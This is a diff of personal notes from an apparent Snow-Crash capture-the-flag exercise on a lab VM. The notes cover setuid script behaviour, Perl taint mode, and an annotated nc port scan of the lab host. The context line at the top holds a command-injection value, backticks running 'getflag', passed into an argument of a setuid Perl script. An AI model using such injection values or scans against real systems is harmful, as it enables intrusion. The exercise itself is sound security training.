@@ -16,15 +16,16 @@ PATH=/var/tmp:$PATH ./level04.pl x='` getflag`'
 https://lea-linux.org/documentations/Dev-suid_scripts
 https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts
 
+script with bang #! have a special interaction with suid
 But perl has a suid_safe mode that disallow user running suid script
 so this method doesn't work
 ( ruby has a taint mode with perl -T ) // doesn't matter here
 
 https://www.cyberciti.biz/faq/linux-port-scanning/
 ~/git/Snow-Crash(master*) » nc -zv 10.13.0.141 1-10000 2>&1 | grep -v refused | grep succeed       ygarrot@e3r8p21
-Connection to 10.13.0.141 port 80 [tcp/http] succeeded!
-Connection to 10.13.0.141 port 4242 [tcp/*] succeeded!
-Connection to 10.13.0.141 port 4646 [tcp/*] succeeded!
+Connection to 10.13.0.141 port 80 [tcp/http] succeeded! //http
+Connection to 10.13.0.141 port 4242 [tcp/*] succeeded! //ssh
+Connection to 10.13.0.141 port 4646 [tcp/*] succeeded! // ca donne pas grand chose
 Connection to 10.13.0.141 port 4747 [tcp/*] succeeded!
 
 
